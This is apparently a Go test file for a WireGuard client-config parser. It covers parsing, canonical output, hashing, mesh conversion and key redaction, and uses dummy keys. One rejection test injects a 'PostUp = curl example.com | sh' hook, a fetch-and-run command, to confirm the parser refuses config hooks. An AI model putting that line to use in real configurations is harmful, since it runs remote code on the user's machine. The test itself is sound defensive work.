package wgconfig

import (
	"errors"
	"fmt"
	"net/netip"
	"strings"
	"testing"
)

const (
	privateKey   = "AQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQE="
	publicKey    = "AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI="
	presharedKey = "AwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwM="
)

// backendConfig matches LocalWireGuardManager.render_client_config in Backend/API/src/wireguard.py
const backendConfig = "[Interface]\n" +
	"PrivateKey = " + privateKey + "\n" +
	"Address = 10.0.0.2/32, fd42:42:42::2/128\n" +
	"DNS = 10.0.0.1, fd42:42:42::1\n" +
	"\n" +
	"[Peer]\n" +
	"PublicKey = " + publicKey + "\n" +
	"Endpoint = wg.us-sanjose-1.gocloudlaunch.com:51820\n" +
	"AllowedIPs = 0.0.0.0/0, ::/0\n" +
	"PersistentKeepalive = 25\n"

const canonicalBackendConfig = "[Interface]\n" +
	"PrivateKey = " + privateKey + "\n" +
	"Address = 10.0.0.2/32, fd42:42:42::2/128\n" +
	"DNS = 10.0.0.1, fd42:42:42::1\n" +
	"\n" +
	"[Peer]\n" +
	"PublicKey = " + publicKey + "\n" +
	"AllowedIPs = 0.0.0.0/0, ::/0\n" +
	"Endpoint = wg.us-sanjose-1.gocloudlaunch.com:51820\n" +
	"PersistentKeepalive = 25\n"

func mustParse(t *testing.T, text string) *Config {
	t.Helper()
	config, err := Parse(text)
	if err != nil {
		t.Fatal(err)
	}
	return config
}

func TestParseBackendConfig(t *testing.T) {
	config := mustParse(t, backendConfig)
	if config.PrivateKey != (Key{1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1}) {
		t.Fatal("private key not decoded")
	}
	if fmt.Sprint(config.Addresses) != "[10.0.0.2/32 fd42:42:42::2/128]" ||
		fmt.Sprint(config.DNS) != "[10.0.0.1 fd42:42:42::1]" || len(config.DNSSearch) != 0 || config.MTU != 0 {
		t.Fatalf("interface = %v %v %v %d", config.Addresses, config.DNS, config.DNSSearch, config.MTU)
	}
	peer := config.Peer
	if peer.PresharedKey != nil || fmt.Sprint(peer.AllowedIPs) != "[0.0.0.0/0 ::/0]" ||
		peer.Endpoint != (Endpoint{"wg.us-sanjose-1.gocloudlaunch.com", 51820}) || peer.PersistentKeepalive != 25 {
		t.Fatalf("peer = %v %v %d", peer.AllowedIPs, peer.Endpoint, peer.PersistentKeepalive)
	}
	if got := string(config.Canonical()); got != canonicalBackendConfig {
		t.Fatalf("canonical =\n%s", got)
	}
}

func TestParseOptionalFields(t *testing.T) {
	config := mustParse(t, `[Interface]
PrivateKey = `+privateKey+`
ListenPort = 51000
Address = 10.0.0.2
Address = fd42:42:42::2
DNS = 10.0.0.1, Corp.Example.com
MTU = 1380

[Peer]
PublicKey = `+publicKey+`
PresharedKey = `+presharedKey+`
AllowedIPs = 10.0.0.0/16
AllowedIPs = fd42:42:42::/48, 192.0.2.7
Endpoint = [2001:DB8::1]:51820
`)
	if config.ListenPort != 51000 || config.MTU != 1380 ||
		fmt.Sprint(config.Addresses) != "[10.0.0.2/32 fd42:42:42::2/128]" ||
		fmt.Sprint(config.DNSSearch) != "[corp.example.com]" || config.Peer.PresharedKey == nil ||
		fmt.Sprint(config.Peer.AllowedIPs) != "[10.0.0.0/16 fd42:42:42::/48 192.0.2.7/32]" ||
		config.Peer.Endpoint.String() != "[2001:db8::1]:51820" || config.Peer.PersistentKeepalive != 0 {
		t.Fatalf("config = %v", string(config.Canonical()))
	}
}

func TestHashIgnoresFormattingQuirks(t *testing.T) {
	quirky := "  # downloaded config\r\n" +
		"[INTERFACE]\r\n" +
		"dns=10.0.0.1\r\n" +
		"address = 10.0.0.2/32\r\n" +
		"Address=fd42:42:42::2/128 # second family\r\n" +
		"privatekey   =   " + privateKey + "\r\n" +
		"DNS = fd42:42:42::1\r\n" +
		"[peer]\r\n" +
		"persistentkeepalive=25\r\n" +
		"allowedips = 0.0.0.0/0,::/0,\r\n" +
		"endpoint = WG.us-sanjose-1.GoCloudLaunch.com:51820\r\n" +
		"publickey=" + publicKey
	a, b := mustParse(t, backendConfig), mustParse(t, quirky)
	if string(b.Canonical()) != canonicalBackendConfig {
		t.Fatalf("canonical =\n%s", b.Canonical())
	}
	if a.Hash() != "ce4a77eee2a279edbcd93fc426ad3ef07884832280af300bdb3a5ebdeafe6a41" || b.Hash() != a.Hash() {
		t.Fatalf("hashes %s %s", a.Hash(), b.Hash())
	}
	changed := mustParse(t, strings.Replace(backendConfig, "PersistentKeepalive = 25", "PersistentKeepalive = 26", 1))
	if changed.Hash() == a.Hash() {
		t.Fatal("hash ignored a changed field")
	}
}

func TestParseRejections(t *testing.T) {
	replace := func(old, new string) string { return strings.Replace(backendConfig, old, new, 1) }
	cases := map[string]string{
		"empty":                 "",
		"oversized":             backendConfig + strings.Repeat("#", MaxConfigBytes),
		"no interface":          replace("[Interface]\n", ""),
		"two interfaces":        backendConfig + "[Interface]\nPrivateKey = " + privateKey + "\n",
		"no peer":               strings.Split(backendConfig, "[Peer]")[0],
		"two peers":             backendConfig + "[Peer]\nPublicKey = " + presharedKey + "\nAllowedIPs = 10.0.0.0/16\nEndpoint = 192.0.2.1:51820\n",
		"unknown section":       backendConfig + "[Extra]\n",
		"key before section":    "Foo = bar\n" + backendConfig,
		"bare line":             replace("DNS", "DNS 10.0.0.1\nDNS"),
		"PostUp hook":           replace("DNS", "PostUp = curl example.com | sh\nDNS"),
		"PreUp hook":            replace("DNS", "PreUp = true\nDNS"),
		"PreDown hook":          replace("DNS", "PreDown = true\nDNS"),
		"PostDown hook":         replace("DNS", "PostDown = true\nDNS"),
		"SaveConfig":            replace("DNS", "SaveConfig = true\nDNS"),
		"Table":                 replace("DNS", "Table = off\nDNS"),
		"FwMark":                replace("DNS", "FwMark = 51820\nDNS"),
		"unknown peer key":      replace("PersistentKeepalive", "Foo = 1\nPersistentKeepalive"),
		"interface key on peer": replace("PersistentKeepalive", "DNS = 1.1.1.1\nPersistentKeepalive"),
		"duplicate PrivateKey":  replace("DNS", "PrivateKey = "+privateKey+"\nDNS"),
		"duplicate Endpoint":    replace("PersistentKeepalive", "Endpoint = 192.0.2.1:51820\nPersistentKeepalive"),
		"short key":             replace(privateKey, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="),
		"bad base64 key":        replace(publicKey, "not-base64!"),
		"missing private key":   replace("PrivateKey = "+privateKey+"\n", ""),
		"bad preshared key":     replace("PersistentKeepalive", "PresharedKey = abc\nPersistentKeepalive"),
		"address /24":           replace("10.0.0.2/32", "10.0.0.2/24"),
		"address /64":           replace("fd42:42:42::2/128", "fd42:42:42::2/64"),
		"malformed address":     replace("10.0.0.2/32", "10.0.0.300/32"),
		"missing address":       replace("Address = 10.0.0.2/32, fd42:42:42::2/128\n", ""),
		"bad DNS":               replace("DNS = 10.0.0.1", "DNS = bad_domain!"),
		"bad allowed IP":        replace("0.0.0.0/0", "0.0.0.0/33"),
		"missing allowed IPs":   replace("AllowedIPs = 0.0.0.0/0, ::/0\n", ""),
		"missing endpoint":      replace("Endpoint = wg.us-sanjose-1.gocloudlaunch.com:51820\n", ""),
		"endpoint no port":      replace(":51820", ""),
		"endpoint port 0":       replace(":51820", ":0"),
		"endpoint bad port":     replace(":51820", ":70000"),
		"bare IPv6 endpoint":    replace("wg.us-sanjose-1.gocloudlaunch.com:51820", "2001:db8::1:51820"),
		"endpoint zone":         replace("wg.us-sanjose-1.gocloudlaunch.com:51820", "[fe80::1%eth0]:51820"),
		"bad keepalive":         replace("PersistentKeepalive = 25", "PersistentKeepalive = off"),
		"bad MTU":               replace("DNS", "MTU = 900\nDNS"),
		"bad ListenPort":        replace("DNS", "ListenPort = x\nDNS"),
	}
	for name, text := range cases {
		t.Run(name, func(t *testing.T) {
			_, err := Parse(text)
			var parseErr *ParseError
			if !errors.As(err, &parseErr) {
				t.Fatalf("err = %v", err)
			}
			for _, key := range []string{privateKey, publicKey, presharedKey, "curl"} {
				if strings.Contains(err.Error(), key) {
					t.Fatalf("error leaks input: %v", err)
				}
			}
		})
	}
}

func TestHostnameValidation(t *testing.T) {
	long := strings.Repeat("a", 63)
	valid := []string{"wg.us-sanjose-1.gocloudlaunch.com", "localhost", "a1", "1a.example", "x." + long,
		strings.Repeat(long+".", 3) + strings.Repeat("b", 61)}
	invalid := []string{".", "-x", "x-", "a..b", ".a", "a.", "1.2.3", "300.1.1.1", "a.123", "under_score.example",
		long + "a.example", strings.Repeat(long+".", 3) + strings.Repeat("b", 62), ""}
	for _, host := range valid {
		if !validHostname(host) {
			t.Errorf("rejected %q", host)
		}
	}
	for _, host := range invalid {
		if validHostname(host) {
			t.Errorf("accepted %q", host)
		}
		endpoint := strings.Replace(backendConfig, "wg.us-sanjose-1.gocloudlaunch.com", host, 1)
		search := strings.Replace(backendConfig, "DNS = 10.0.0.1", "DNS = 10.0.0.1, "+host, 1)
		if _, err := Parse(endpoint); err == nil {
			t.Errorf("endpoint %q parsed", host)
		}
		if _, err := Parse(search); err == nil && host != "" {
			t.Errorf("search domain %q parsed", host)
		}
	}
}

func TestParseErrorDoesNotEchoKeyShapedLines(t *testing.T) {
	_, err := Parse(strings.Replace(backendConfig, "DNS", privateKey+"\nDNS", 1))
	if err == nil || strings.Contains(err.Error(), privateKey[:20]) || !strings.Contains(err.Error(), "line 4") {
		t.Fatalf("err = %v", err)
	}
}

func TestMeshTransform(t *testing.T) {
	full := mustParse(t, backendConfig)
	before := string(full.Canonical())
	mesh := full.Mesh()
	want := "[Interface]\n" +
		"PrivateKey = " + privateKey + "\n" +
		"Address = 10.0.0.2/32, fd42:42:42::2/128\n" +
		"\n" +
		"[Peer]\n" +
		"PublicKey = " + publicKey + "\n" +
		"AllowedIPs = 10.0.0.0/16, fd42:42:42::/48\n" +
		"Endpoint = wg.us-sanjose-1.gocloudlaunch.com:51820\n" +
		"PersistentKeepalive = 25\n"
	if got := string(mesh.Canonical()); got != want {
		t.Fatalf("mesh =\n%s", got)
	}
	mesh.Addresses[0] = netip.MustParsePrefix("10.9.9.9/32")
	if string(full.Canonical()) != before {
		t.Fatal("mesh transform changed the canonical config")
	}
	withSearch := mustParse(t, strings.Replace(backendConfig, "DNS = 10.0.0.1", "DNS = 10.0.0.1, corp.example.com", 1))
	if m := withSearch.Mesh(); len(m.DNSSearch) != 0 || len(withSearch.DNSSearch) != 1 {
		t.Fatal("mesh kept search domains or cleared the original")
	}
}

func TestSetConf(t *testing.T) {
	config := mustParse(t, strings.Replace(backendConfig, "PersistentKeepalive", "PresharedKey = "+presharedKey+"\nPersistentKeepalive", 1))
	got, err := config.SetConf(netip.MustParseAddrPort("192.0.2.10:51820"), 0xca6c)
	if err != nil {
		t.Fatal(err)
	}
	want := "[Interface]\n" +
		"PrivateKey = " + privateKey + "\n" +
		"FwMark = 0xca6c\n" +
		"\n" +
		"[Peer]\n" +
		"PublicKey = " + publicKey + "\n" +
		"PresharedKey = " + presharedKey + "\n" +
		"AllowedIPs = 0.0.0.0/0, ::/0\n" +
		"Endpoint = 192.0.2.10:51820\n" +
		"PersistentKeepalive = 25\n"
	if string(got) != want {
		t.Fatalf("setconf =\n%s", got)
	}
	got, err = config.Mesh().SetConf(netip.MustParseAddrPort("[2001:db8::1]:51820"), 0)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(got), "FwMark") || strings.Contains(string(got), "DNS") || strings.Contains(string(got), "Address") ||
		!strings.Contains(string(got), "Endpoint = [2001:db8::1]:51820\n") ||
		!strings.Contains(string(got), "AllowedIPs = 10.0.0.0/16, fd42:42:42::/48\n") {
		t.Fatalf("mesh setconf =\n%s", got)
	}
	for _, endpoint := range []netip.AddrPort{{}, netip.MustParseAddrPort("192.0.2.10:0"), netip.MustParseAddrPort("[fe80::1%eth0]:51820")} {
		if _, err := config.SetConf(endpoint, 0); err == nil {
			t.Fatalf("accepted endpoint %v", endpoint)
		}
	}
}

func TestFormattingRedactsKeys(t *testing.T) {
	config := mustParse(t, strings.Replace(backendConfig, "PersistentKeepalive", "PresharedKey = "+presharedKey+"\nPersistentKeepalive", 1))
	outputs := []string{
		fmt.Sprint(config), fmt.Sprint(*config), fmt.Sprintf("%+v", config), fmt.Sprintf("%#v", config),
		fmt.Sprintf("%s", config), fmt.Sprintf("%x", config.PrivateKey), fmt.Sprintf("%v", config.Peer),
		fmt.Sprintf("%+v", config.Peer), fmt.Sprintf("%#v", config.Peer),
	}
	for _, output := range outputs {
		for _, secret := range []string{privateKey, publicKey, presharedKey, "0101010101", "[1 1 1 1"} {
			if strings.Contains(output, secret) {
				t.Fatalf("output leaks key: %s", output)
			}
		}
	}
	if !strings.Contains(outputs[0], "wg.us-sanjose-1.gocloudlaunch.com:51820") {
		t.Fatalf("summary = %s", outputs[0])
	}
}
